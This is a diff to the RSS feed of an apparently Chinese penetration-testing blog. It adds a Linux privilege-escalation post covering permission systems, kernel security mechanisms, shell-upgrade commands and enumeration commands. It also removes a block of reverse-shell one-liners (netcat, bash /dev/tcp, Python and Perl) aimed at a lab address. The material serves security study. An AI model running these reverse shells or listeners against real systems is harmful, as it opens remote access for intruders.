@@ -1,4 +1,170 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Welcome My Hack's Blog</title><link>https://enilmalus.github.io/posts/</link><description>Recent content in Posts on Welcome My Hack's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 01 Jan 2026 00:40:00 +0800</lastBuildDate><atom:link href="https://enilmalus.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>John 工作原理分析</title><link>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</link><pubDate>Thu, 01 Jan 2026 00:40:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</guid><description>&lt;h2 id="ssh2john-提取私钥"&gt;ssh2john 提取私钥&lt;/h2&gt;
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Welcome My Hack's Blog</title><link>https://enilmalus.github.io/posts/</link><description>Recent content in Posts on Welcome My Hack's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 05 Jan 2026 12:00:00 +0800</lastBuildDate><atom:link href="https://enilmalus.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Linux 提权专区</title><link>https://enilmalus.github.io/posts/linux-%E6%8F%90%E6%9D%83%E4%B8%93%E5%8C%BA/</link><pubDate>Mon, 05 Jan 2026 12:00:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/linux-%E6%8F%90%E6%9D%83%E4%B8%93%E5%8C%BA/</guid><description>&lt;h2 id="linux-提权简介"&gt;Linux 提权简介&lt;/h2&gt;
+&lt;p&gt;提权，即权限提升，源自英语词汇 Privilege Escalation，也可以缩写为 PrivEsca 或 PE。具体提权方法取决于目标系统的配置。我们可以通过分析诸如内核版本、已安装的应用程序、支持的编程语言和其他用户的凭据等关键元素，找到获取 root 权限的方法。这些关键元素通常包括操作系统或应用程序的错误配置、漏洞、超特权用户或弱凭据。&lt;/p&gt;
+&lt;h2 id="提权原理"&gt;提权原理&lt;/h2&gt;
+&lt;h3 id="常用权限体系"&gt;常用权限体系&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;ugo 基本权限：文件权限和所有权，Linux 系统使用基于用户、组和其他用户的权限体系来控制对文件和目录的访问。此外，通过文件的所有者和所属设置，可以实现更细粒度的访问控制。&lt;/li&gt;
+&lt;li&gt;suid、sgid、sticky 权限：它们可以授予用户或组特定的权限，使得在特定的条件下可以执行一些非常有用的操作。前两者程序将以文件 所有者/所有组 的身份来执行，Sticky Bit 权限用于在共享文件夹中限制文件的删除权限。&lt;/li&gt;
+&lt;li&gt;Capabilities：Linux Capabilities 是一种将传统的全局权限分割为更小、独立的权限单元的机制，以便于应用程序和服务分配更细粒度的权限，限制潜在的安全风险。&lt;/li&gt;
+&lt;li&gt;AppArmor 和 SELinux：这两种安全模块通过强制访问控制（MAC）策略增强了系统的安全性。它们可以限制进程和文件的访问权限，从而降低潜在的安全风险。AppArmor 是 MAC 的实现，专为 Linux 系统设计。与 SELinux 不同，APPArmor 使用路径名来识别与保护系统资源，而不是安全上下文。AppArmor 通过定义所谓的 “配置文件”，为每个应用程序设定允许和禁止的操作，从而限制进程对系统资源的访问。AppArmor 相对于 SELinux 来说，更容易配置和管理，但在某些情况下可能不如 SELinux 强大。SELinux 是另一种 MAC 的实现。最初由美国国家安全局（NSA）开发，后来集成到许多 Linux 发行版本中。SELinux 通过为文件、进程等系统资源分配安全上下文（安全标签），并根据预先定义的安全策略规则来控制访问。SELinux 旨在防止恶意软件或由漏洞的应用程序造成的潜在损害，并限制了它们对系统资源的访问。&lt;/li&gt;
+&lt;li&gt;Access Control Lists（ACLs）：ACLs 提供了比传统文件权限更灵活的权限管理方式，允许为特定用户和组分配文件或目录的特定权限。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id="其他-20-个权限体系和安全机制"&gt;其他 20 个权限体系和安全机制&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;Grsecurity：是一套安全补丁和配置系统，用于 Linux 内核，旨在增强系统的安全性。它包括许多功能，如控制访问、内存保护以及提供系统的稳定性 Grsecurity 通过实现强制访问控制、内存保护以及其他特性，从而降低攻击者利用漏洞的机会。&lt;/li&gt;
+&lt;li&gt;PaX：是一种用于 Linux 内核的内存保护补丁。它旨在防止攻击者利用内存错误，如缓冲区溢出等漏洞。PaX 主要通过两种技术实现保护：地址空间布局随机化（ASLR）和非可执行内存页。这两种技术互相配合，能有效防止攻击者执行恶意代码。&lt;/li&gt;
+&lt;li&gt;polkit（PolicyKit）：是一个用于操作系统级别权限的控制框架，它允许非特权用户执行特权操作。它为应用程序提供了一种有限的授权，使其能够执行需要特权的操作，而无需提升整个应用程序的权限。&lt;/li&gt;
+&lt;li&gt;Execshield：是一种 Linux 内核安全特性，由 Red Hat 公司开发。他的目标是防止缓冲区溢出攻击和其他相关的漏洞利用。Exeshield 的主要功能包括使栈和堆不可执行、随机化内存布局和限制内核态代码的执行。&lt;/li&gt;
+&lt;li&gt;ASLR：ASLR（Address Space Layout Randomization）是一种内存保护技术，用于随机化程序在内存中的地址空间布局。使得攻击者更难预测恶意代码的地址，降低了攻击的可能性。ASLR 可以应用于操作系统内核和用户程序，增强整个系统的安全性。&lt;/li&gt;
+&lt;li&gt;TOMOYO Linux：TOMOYO Linux 是一种用于 Linux 内核的强制访问控制（MAC）安全模块，与 SELinux 和 AppArmor 类似。它通过轻量级的配置和易于理解的策略语法，帮助管理员管理程序和访问权限。&lt;/li&gt;
+&lt;li&gt;SMACK（Simplified Mandatory Access Control Kernel）：SMACK 是一种基于 Linux 的简化强制访问控制内核。它通过为程序分配安全标签来限制进程间通信和文件访问。SMACK 旨在实现简单易用的访问控制策略。&lt;/li&gt;
+&lt;li&gt;IMA（Integrity Measurement Architecture）：IMA 是一种 Linux 安全模块，用于确保文件的完整性。它通过对文件生成数字签名并将其与文件一起储存，以确保文件没有被篡改。IMA 可以与其他安全框架（如 SELinux 或 AppArmor）配合使用，提供更全面的系统安全保护。&lt;/li&gt;
+&lt;li&gt;Yama：Yama 是一种 Linux 安全模块，用于实施一些基本的系统安全策略，例如限制进程跟踪功能。Yama 的目的是提供一些额外的保护措施，以降低潜在漏洞的影响。&lt;/li&gt;
+&lt;li&gt;CGroups（Control Groups）：CGroups 是一种 Linux 内核功能，允许将进程分组分配资源（如 CPU、内存和磁盘空间）。虽然 CGroups 主要用于资源管理，但它也可以用于隔离进程，提高系统安全性。&lt;/li&gt;
+&lt;li&gt;Linux Namespaces：Namespaces 是一种 Linux 内核特性，用于隔离进程的运行环境。Namespaces 可以限制进程访问其他进程、文件系统和网络资源，从而提高系统安全性。&lt;/li&gt;
+&lt;li&gt;StackGuard：StackGuard 是一种编译器扩展，用于防止缓冲区溢出攻击。它在栈帧中插入一个 “canary” 值，以检测潜在的栈溢出。如果 “canary” 值被篡改，程序会在攻击者获得执行权限之前终止，从而阻止攻击。&lt;/li&gt;
+&lt;li&gt;ProPolice：Propolice（也称为 SSP，Stack Smashing Protector）是另一种编译器扩展，类似于 StackGuard。它也在栈帧中插入 “canary” 值，以防止缓冲区溢出攻击。ProPolice 同时还对局部变量进行重新排序，以减小攻击成功的可能性。&lt;/li&gt;
+&lt;li&gt;seccomp：seccomp（安全计算模式）是一种 Linux 内核功能，允许进程限制其系统调用的使用。通过使用 seccomp，程序可以限制其对系统资源的访问，从而提高安全性。seccomp 通常与沙箱技术和容器一起使用，为应用程序提供隔离的运行环境。&lt;/li&gt;
+&lt;li&gt;ptrace：ptrace 是一种允许一个进程观察和控制另一个进程的执行的 Linux 系统调用。虽然 ptrace 通常用于调试目的，但它也可用于实现沙箱和其他安全措施。然而，ptrace 本身可能会被攻击者利用，因此需要谨慎使用。&lt;/li&gt;
+&lt;li&gt;Capsicum：Capsicum 是一种为 Unix-like 系统（如 FreeBSD 和 Linux）提供沙箱和能力分离的安全框架。它允许程序将自己限制在受限的沙箱环境中运行，从而降低潜在漏洞的影响。&lt;/li&gt;
+&lt;li&gt;MPROTECT：MPROTECT 是一种用于标记内存页为只读或不可执行的内核功能。它可以防止攻击者将数据区域（如堆和栈）用于执行恶意代码。MPROTECT 通常与其他内存保护技术（如 ASLR 和 PaX ）一起使用，提高系统安全性。&lt;/li&gt;
+&lt;li&gt;Mandatory Access Control（MAC）：强制控制访问是一种安全策略，强制执行访问控制规则。与自主访问控制（Discretionary Access Control，DAC）相比，MAC 更严格地限制了对象（如文件和进程）之间的交互。AppArmor 和 SELinux 就是 MAC 地实现。&lt;/li&gt;
+&lt;li&gt;Chroot：Chroot 是一种将进程限制在文件系统地子目录中运行地技术，从而限制进程访问系统中的其他部分。尽管 Chroot 可以提供一定程度的隔离，但它并不是一个完全安全的沙箱解决方案。&lt;/li&gt;
+&lt;li&gt;Firejail：Firejail 是一种用于 Linux 和其他 Unix-like 系统的沙箱工具。它允许将程序限制在一个受限的运行环境中，以减少潜在的安全风险。Firejail 可以与 seccomp、namespaces、CGroups 等内核功能结合使用，以提供更强大的隔离和安全保护。&lt;/li&gt;
+&lt;li&gt;Kernel Address Space Layout Randomization（KASLR）：KASLR 是一种内核级别的地址空间布局随机化技术，用于随机化内核代码和数据在内存中的地址。KASLR 旨在防止攻击者利用内核漏洞，从而提高系统安全性。&lt;/li&gt;
+&lt;li&gt;Control Flow Integrity（CFI）：控制流完整性是一种用于检测和防止控制流劫持攻击（如返回导向编程和条约导向编程）的安全策略。CFI 可以在编译器和硬件层面实现，以保护程序免受此类攻击。&lt;/li&gt;
+&lt;li&gt;AddressSanitizer：AddressSanitzer 是一种用于检测内存错误（如缓冲区溢出和使用后释放）的编译器扩展。&lt;/li&gt;
+&lt;li&gt;AM（Pluggable Authentication Modules，可插入认证模块）是一种灵活的认证框架，用于在 Linux 和 UNIX 系统上实现各种认证策略。PAM 允许系统管理员在不修改已有程序的情况下，为各种应用程序和服务配置和管理认证方法。PAM 的核心概念是将认证过程分解为一系列可插入的模块，这些模块可以独立于应用程序进行更新和配置。这种分离使得管理员可以轻松地在系统中添加、删除或更改认证策略，而无需重新编译或修改应用程序。PAM 主要用于以下四个方面：
+&lt;ol&gt;
+&lt;li&gt;认证：验证用户身份，通常是通过检查用户输入的用户名和密码完成。PAM 模块可以支持各种不同地认证方法，如本地密码文件、LDAP、Kerberos 等。&lt;/li&gt;
+&lt;li&gt;账户管理：检查用户账户的访问权限，如密码过期、时间限制、IP 地址限制等。账户管理模块可以在用户通过认证后执行这些检查。&lt;/li&gt;
+&lt;li&gt;会话管理：管理用户登入会话。会话管理模块可以在用户登录和注销时执行特定的任务，如挂在家目录、设置环境变量等。&lt;/li&gt;
+&lt;li&gt;密码管理：处理用户密码更改和相关策略。密码管理模块可以强制实施密码复杂性规则、历史记录检查等。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id="提权原理-1"&gt;提权原理&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;低权限可修改的执行文件或脚本，能以高权限身份允许。&lt;/li&gt;
+&lt;li&gt;从用户行为角度，用低权限用户的运维人员，也需要记忆、输入、备份凭据，以备使用高权限用户完成操作。&lt;/li&gt;
+&lt;li&gt;在权限的上层，捕捉、拦截、修改凭据信息或权限信息，如一些基于内存读取操作实现的内核利用。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id="linux-提权枚举"&gt;Linux 提权枚举&lt;/h2&gt;
+&lt;h3 id="终端升级与提高稳定性"&gt;终端升级与提高稳定性&lt;/h3&gt;
+&lt;p&gt;在 Linux 目标获得立足点时，首先应该尝试的是将 shell 升级为完整的 TTY（交互式 shell）。&lt;/p&gt;</description><content type="html"><![CDATA[<h2 id="linux-提权简介">Linux 提权简介</h2>
+<p>提权，即权限提升，源自英语词汇 Privilege Escalation，也可以缩写为 PrivEsca 或 PE。具体提权方法取决于目标系统的配置。我们可以通过分析诸如内核版本、已安装的应用程序、支持的编程语言和其他用户的凭据等关键元素，找到获取 root 权限的方法。这些关键元素通常包括操作系统或应用程序的错误配置、漏洞、超特权用户或弱凭据。</p>
+<h2 id="提权原理">提权原理</h2>
+<h3 id="常用权限体系">常用权限体系</h3>
+<ol>
+<li>ugo 基本权限：文件权限和所有权，Linux 系统使用基于用户、组和其他用户的权限体系来控制对文件和目录的访问。此外，通过文件的所有者和所属设置，可以实现更细粒度的访问控制。</li>
+<li>suid、sgid、sticky 权限：它们可以授予用户或组特定的权限，使得在特定的条件下可以执行一些非常有用的操作。前两者程序将以文件 所有者/所有组 的身份来执行，Sticky Bit 权限用于在共享文件夹中限制文件的删除权限。</li>
+<li>Capabilities：Linux Capabilities 是一种将传统的全局权限分割为更小、独立的权限单元的机制，以便于应用程序和服务分配更细粒度的权限，限制潜在的安全风险。</li>
+<li>AppArmor 和 SELinux：这两种安全模块通过强制访问控制（MAC）策略增强了系统的安全性。它们可以限制进程和文件的访问权限，从而降低潜在的安全风险。AppArmor 是 MAC 的实现，专为 Linux 系统设计。与 SELinux 不同，APPArmor 使用路径名来识别与保护系统资源，而不是安全上下文。AppArmor 通过定义所谓的 “配置文件”，为每个应用程序设定允许和禁止的操作，从而限制进程对系统资源的访问。AppArmor 相对于 SELinux 来说，更容易配置和管理，但在某些情况下可能不如 SELinux 强大。SELinux 是另一种 MAC 的实现。最初由美国国家安全局（NSA）开发，后来集成到许多 Linux 发行版本中。SELinux 通过为文件、进程等系统资源分配安全上下文（安全标签），并根据预先定义的安全策略规则来控制访问。SELinux 旨在防止恶意软件或由漏洞的应用程序造成的潜在损害，并限制了它们对系统资源的访问。</li>
+<li>Access Control Lists（ACLs）：ACLs 提供了比传统文件权限更灵活的权限管理方式，允许为特定用户和组分配文件或目录的特定权限。</li>
+</ol>
+<h3 id="其他-20-个权限体系和安全机制">其他 20 个权限体系和安全机制</h3>
+<ol>
+<li>Grsecurity：是一套安全补丁和配置系统，用于 Linux 内核，旨在增强系统的安全性。它包括许多功能，如控制访问、内存保护以及提供系统的稳定性 Grsecurity 通过实现强制访问控制、内存保护以及其他特性，从而降低攻击者利用漏洞的机会。</li>
+<li>PaX：是一种用于 Linux 内核的内存保护补丁。它旨在防止攻击者利用内存错误，如缓冲区溢出等漏洞。PaX 主要通过两种技术实现保护：地址空间布局随机化（ASLR）和非可执行内存页。这两种技术互相配合，能有效防止攻击者执行恶意代码。</li>
+<li>polkit（PolicyKit）：是一个用于操作系统级别权限的控制框架，它允许非特权用户执行特权操作。它为应用程序提供了一种有限的授权，使其能够执行需要特权的操作，而无需提升整个应用程序的权限。</li>
+<li>Execshield：是一种 Linux 内核安全特性，由 Red Hat 公司开发。他的目标是防止缓冲区溢出攻击和其他相关的漏洞利用。Exeshield 的主要功能包括使栈和堆不可执行、随机化内存布局和限制内核态代码的执行。</li>
+<li>ASLR：ASLR（Address Space Layout Randomization）是一种内存保护技术，用于随机化程序在内存中的地址空间布局。使得攻击者更难预测恶意代码的地址，降低了攻击的可能性。ASLR 可以应用于操作系统内核和用户程序，增强整个系统的安全性。</li>
+<li>TOMOYO Linux：TOMOYO Linux 是一种用于 Linux 内核的强制访问控制（MAC）安全模块，与 SELinux 和 AppArmor 类似。它通过轻量级的配置和易于理解的策略语法，帮助管理员管理程序和访问权限。</li>
+<li>SMACK（Simplified Mandatory Access Control Kernel）：SMACK 是一种基于 Linux 的简化强制访问控制内核。它通过为程序分配安全标签来限制进程间通信和文件访问。SMACK 旨在实现简单易用的访问控制策略。</li>
+<li>IMA（Integrity Measurement Architecture）：IMA 是一种 Linux 安全模块，用于确保文件的完整性。它通过对文件生成数字签名并将其与文件一起储存，以确保文件没有被篡改。IMA 可以与其他安全框架（如 SELinux 或 AppArmor）配合使用，提供更全面的系统安全保护。</li>
+<li>Yama：Yama 是一种 Linux 安全模块，用于实施一些基本的系统安全策略，例如限制进程跟踪功能。Yama 的目的是提供一些额外的保护措施，以降低潜在漏洞的影响。</li>
+<li>CGroups（Control Groups）：CGroups 是一种 Linux 内核功能，允许将进程分组分配资源（如 CPU、内存和磁盘空间）。虽然 CGroups 主要用于资源管理，但它也可以用于隔离进程，提高系统安全性。</li>
+<li>Linux Namespaces：Namespaces 是一种 Linux 内核特性，用于隔离进程的运行环境。Namespaces 可以限制进程访问其他进程、文件系统和网络资源，从而提高系统安全性。</li>
+<li>StackGuard：StackGuard 是一种编译器扩展，用于防止缓冲区溢出攻击。它在栈帧中插入一个 “canary” 值，以检测潜在的栈溢出。如果 “canary” 值被篡改，程序会在攻击者获得执行权限之前终止，从而阻止攻击。</li>
+<li>ProPolice：Propolice（也称为 SSP，Stack Smashing Protector）是另一种编译器扩展，类似于 StackGuard。它也在栈帧中插入 “canary” 值，以防止缓冲区溢出攻击。ProPolice 同时还对局部变量进行重新排序，以减小攻击成功的可能性。</li>
+<li>seccomp：seccomp（安全计算模式）是一种 Linux 内核功能，允许进程限制其系统调用的使用。通过使用 seccomp，程序可以限制其对系统资源的访问，从而提高安全性。seccomp 通常与沙箱技术和容器一起使用，为应用程序提供隔离的运行环境。</li>
+<li>ptrace：ptrace 是一种允许一个进程观察和控制另一个进程的执行的 Linux 系统调用。虽然 ptrace 通常用于调试目的，但它也可用于实现沙箱和其他安全措施。然而，ptrace 本身可能会被攻击者利用，因此需要谨慎使用。</li>
+<li>Capsicum：Capsicum 是一种为 Unix-like 系统（如 FreeBSD 和 Linux）提供沙箱和能力分离的安全框架。它允许程序将自己限制在受限的沙箱环境中运行，从而降低潜在漏洞的影响。</li>
+<li>MPROTECT：MPROTECT 是一种用于标记内存页为只读或不可执行的内核功能。它可以防止攻击者将数据区域（如堆和栈）用于执行恶意代码。MPROTECT 通常与其他内存保护技术（如 ASLR 和 PaX ）一起使用，提高系统安全性。</li>
+<li>Mandatory Access Control（MAC）：强制控制访问是一种安全策略，强制执行访问控制规则。与自主访问控制（Discretionary Access Control，DAC）相比，MAC 更严格地限制了对象（如文件和进程）之间的交互。AppArmor 和 SELinux 就是 MAC 地实现。</li>
+<li>Chroot：Chroot 是一种将进程限制在文件系统地子目录中运行地技术，从而限制进程访问系统中的其他部分。尽管 Chroot 可以提供一定程度的隔离，但它并不是一个完全安全的沙箱解决方案。</li>
+<li>Firejail：Firejail 是一种用于 Linux 和其他 Unix-like 系统的沙箱工具。它允许将程序限制在一个受限的运行环境中，以减少潜在的安全风险。Firejail 可以与 seccomp、namespaces、CGroups 等内核功能结合使用，以提供更强大的隔离和安全保护。</li>
+<li>Kernel Address Space Layout Randomization（KASLR）：KASLR 是一种内核级别的地址空间布局随机化技术，用于随机化内核代码和数据在内存中的地址。KASLR 旨在防止攻击者利用内核漏洞，从而提高系统安全性。</li>
+<li>Control Flow Integrity（CFI）：控制流完整性是一种用于检测和防止控制流劫持攻击（如返回导向编程和条约导向编程）的安全策略。CFI 可以在编译器和硬件层面实现，以保护程序免受此类攻击。</li>
+<li>AddressSanitizer：AddressSanitzer 是一种用于检测内存错误（如缓冲区溢出和使用后释放）的编译器扩展。</li>
+<li>AM（Pluggable Authentication Modules，可插入认证模块）是一种灵活的认证框架，用于在 Linux 和 UNIX 系统上实现各种认证策略。PAM 允许系统管理员在不修改已有程序的情况下，为各种应用程序和服务配置和管理认证方法。PAM 的核心概念是将认证过程分解为一系列可插入的模块，这些模块可以独立于应用程序进行更新和配置。这种分离使得管理员可以轻松地在系统中添加、删除或更改认证策略，而无需重新编译或修改应用程序。PAM 主要用于以下四个方面：
+<ol>
+<li>认证：验证用户身份，通常是通过检查用户输入的用户名和密码完成。PAM 模块可以支持各种不同地认证方法，如本地密码文件、LDAP、Kerberos 等。</li>
+<li>账户管理：检查用户账户的访问权限，如密码过期、时间限制、IP 地址限制等。账户管理模块可以在用户通过认证后执行这些检查。</li>
+<li>会话管理：管理用户登入会话。会话管理模块可以在用户登录和注销时执行特定的任务，如挂在家目录、设置环境变量等。</li>
+<li>密码管理：处理用户密码更改和相关策略。密码管理模块可以强制实施密码复杂性规则、历史记录检查等。</li>
+</ol>
+</li>
+</ol>
+<h3 id="提权原理-1">提权原理</h3>
+<ol>
+<li>低权限可修改的执行文件或脚本，能以高权限身份允许。</li>
+<li>从用户行为角度，用低权限用户的运维人员，也需要记忆、输入、备份凭据，以备使用高权限用户完成操作。</li>
+<li>在权限的上层，捕捉、拦截、修改凭据信息或权限信息，如一些基于内存读取操作实现的内核利用。</li>
+</ol>
+<h2 id="linux-提权枚举">Linux 提权枚举</h2>
+<h3 id="终端升级与提高稳定性">终端升级与提高稳定性</h3>
+<p>在 Linux 目标获得立足点时，首先应该尝试的是将 shell 升级为完整的 TTY（交互式 shell）。</p>
+<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;);&#39;
+</code></pre><p>或者</p>
+<pre tabindex="0"><code>rlwrap nc -lvnp 4444
+</code></pre><p>或者</p>
+<pre tabindex="0"><code>script -qc /bin/bash /dev/null
+</code></pre><p>通常 shell 不允许我们执行 clear 命令进行清屏，可以执行下面命令：</p>
+<pre tabindex="0"><code>export TERM=xterm-color
+</code></pre><h3 id="手工枚举技术">手工枚举技术</h3>
+<h4 id="whoami">whoami</h4>
+<p>下面是几条用户枚举命令的用法：</p>
+<ol>
+<li>id：显示当前用户的 UID、GID 以及所属的其他组的信息。id 命令也可以用于获取另一个用户的相同信息。
+<img src="Pasted%20image%2020260105144112.png" alt=""></li>
+<li>who：显示当前登录的用户及相关信息，如登录时间、终端等。
+<img src="Pasted%20image%2020260105144127.png" alt=""></li>
+<li>whoami：显示当前用户的用户名。
+<img src="Pasted%20image%2020260105144156.png" alt=""></li>
+<li>w：提供关于当前登录用户的详细信息，包括它们在做什么以及系统的负载信息。
+<img src="Pasted%20image%2020260105144208.png" alt=""></li>
+<li>last：显示系统最近的登录记录。
+<img src="Pasted%20image%2020260105144235.png" alt=""></li>
+</ol>
+<h4 id="uname--a">uname -a</h4>
+<p>为我们提供关于系统使用的内核的详细信息。在寻找可能导致提权的任何潜在的内核漏洞时，这将非常有用。</p>
+<p>更全的信息查看：</p>
+<pre tabindex="0"><code>uname -a;lsb_release -a;cat /proc/version /etc/issue /etc/*-release
+</code></pre><ol>
+<li>uname -a：这个命令用于显示系统的相关信息，包括内核名称、主机名、内核发行版本、内核版本、硬件名称等。-a 选项表示显示所有可用信息。</li>
+<li>lsb_release -a：这个命令用于显示 Linux 标准基础（LSB）的发行信息。-a 选项表示显示所有可以信息。它将显示诸如发行编号、发行名称、发行描述等信息。</li>
+<li>cat /proc/version：这个命令用于显示内核版本和编译信息。<code>/proc/version</code> 文件包含内核版本、编译器版本和其他相关信息。要查看是否安装了 GCC 就可以用这条命令。</li>
+<li>cat /etc/issue：这个命令用于查看系统的发行版本信息。<code>/etc/issue</code> 文件包含了操作系统发行版的名称和版本。</li>
+<li>cat /etc/*-release：这个命令用于查看系统的发行版本的详细信息。他会搜索 <code>/etc/</code> 目录下所有以 <code>-release</code> 结尾的文件，并显示它们的内容。这些文件通常包含操作系统的发行名称、版本、代号等信息。</li>
+</ol>
+<h4 id="ip-addr">ip addr</h4>
+<p>也可以写作 <code>ip a</code>，旧版命令 <code>ifconfig</code>，这些命令为我们提供有关网卡、网络配置的信息。多张网卡配合路由信息可以发现内网网段。</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
+└─$ ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 00:0c:29:88:e4:07 brd ff:ff:ff:ff:ff:ff
+    inet 10.10.10.5/24 brd 10.10.10.255 scope global dynamic noprefixroute eth0
+       valid_lft 1278sec preferred_lft 1278sec
+    inet6 fe80::2167:25b3:e756:16ad/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+</code></pre><ol>
+<li>ip route：用于查询路由表，<code>route</code> 是过时的命令。</li>
+<li>ip neigh：用于查询邻居表。</li>
+<li>arp -a：用于显示 ARP 缓存，有人将他用于内网主机发现。</li>
+</ol>
+<h4 id="hostname">hostname</h4>
+<p><code>hostname</code> 命令用于返回目标机器的主机名。尽管这个值可以轻易地被更改或者具有相对无意义的字符串（如 Ubuntu1），但在某些情况下，它可以提供有关目标系统在网络中的角色信息（例如，表示生产 SQL 服务器的 SQL-Accounts-01）。</p>
+<p>新内核的 Linux 可以用 <code>hostnamectl</code>。</p>
+<h4 id="sudo--l">sudo -l</h4>
+<p>列出允许用户以 root 权限运行某些（或全部）命令。</p>
+]]></content></item><item><title>John 工作原理分析</title><link>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</link><pubDate>Thu, 01 Jan 2026 00:40:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</guid><description>&lt;h2 id="ssh2john-提取私钥"&gt;ssh2john 提取私钥&lt;/h2&gt;
 &lt;pre tabindex="0"&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
 └─$ ssh2john id_rsa | tee key_hash
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;SSH 私钥文件本身采用专门的格式储存，其中包含了加密的参数消息、加密算法以及密文数据，而不是直接的密码哈希字符串，私钥加密时会采用密钥派生函数（如 PBKDF2 或 bcrypt ）来对口令生成对称密钥，然后用该密钥对私钥数据进行加密，使得文件内容看起来像是一段难以辨别的编码数据。John 是一个专门用于破解密码哈希的工具，他需要知道加密算法的具体参数（例如加密方式、迭代次数、盐值等），才能通过暴力破解或者字典攻击验证猜测的口令是否正确。ssh2john 就是用来解析 SSH 私钥文件，提取出其中的加密参数和密文数据，构造出一个标准化的哈希格式，这种格式正式 John 能够识别并处理的。只有经过这种转换，John 才能根据已知的加密参数对猜测的口令进行验证，否则直接对原始密钥文件进行暴力破解是不现实的，因为文件格式本身并不直接暴露口令的哈希。&lt;/p&gt;
@@ -1294,14 +1460,7 @@ Enter passphrase:
 &lt;h3 id="bash-逃逸"&gt;Bash 逃逸&lt;/h3&gt;
 &lt;p&gt;在获得初始立足点后常常 bash 的交互性并不完善，通常使用 python 的 pty 库获得一个假的、交互性相对好的 bash。&lt;/p&gt;
 &lt;pre tabindex="0"&gt;&lt;code&gt;python3 -c &amp;#34;import pty;pty.spawn(&amp;#39;/bin/bash&amp;#39;);&amp;#34;
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="获得-shell-的一些-反弹-shell"&gt;获得 shell 的一些 反弹 shell&lt;/h3&gt;
-&lt;h4 id="linux"&gt;Linux&lt;/h4&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;nc -e /bin/bash 10.10.10.5 4444
-bash -c &amp;#34;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.5/4444 0&amp;gt;&amp;amp;1&amp;#34;
-python3 -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.10.10.5&amp;#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/bash&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;
-perl -e &amp;#39;use Socket;$i=&amp;#34;10.10.10.5&amp;#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);};&amp;#39;
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="文件属性和可识别字符"&gt;文件属性和可识别字符&lt;/h3&gt;
-&lt;p&gt;在拿到一个文件后可进行如下分析：&lt;/p&gt;</description><content type="html"><![CDATA[<blockquote>
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;运行上面这个命令时，Python 调用 pty.spawn() 函数，创建一个伪终端（pseudo-terminal，简称 pty），并在该终端启动一个心得交互式 bash shell 进程。这个新的伪终端具有完整的交互能力，能够处理用户输入、输出以及终端控制信息（如回显密码提示）。一旦这个新的 shell 被创建就相当于处于一个真正的交互终端中。&lt;/p&gt;</description><content type="html"><![CDATA[<blockquote>
 <p>本文章持续更新中</p>
 </blockquote>
 <h2 id="遇见的情况以及方法论">遇见的情况以及方法论</h2>
@@ -1326,7 +1485,11 @@ Enter passphrase:
 <h3 id="bash-逃逸">Bash 逃逸</h3>
 <p>在获得初始立足点后常常 bash 的交互性并不完善，通常使用 python 的 pty 库获得一个假的、交互性相对好的 bash。</p>
 <pre tabindex="0"><code>python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34;
-</code></pre><h3 id="获得-shell-的一些-反弹-shell">获得 shell 的一些 反弹 shell</h3>
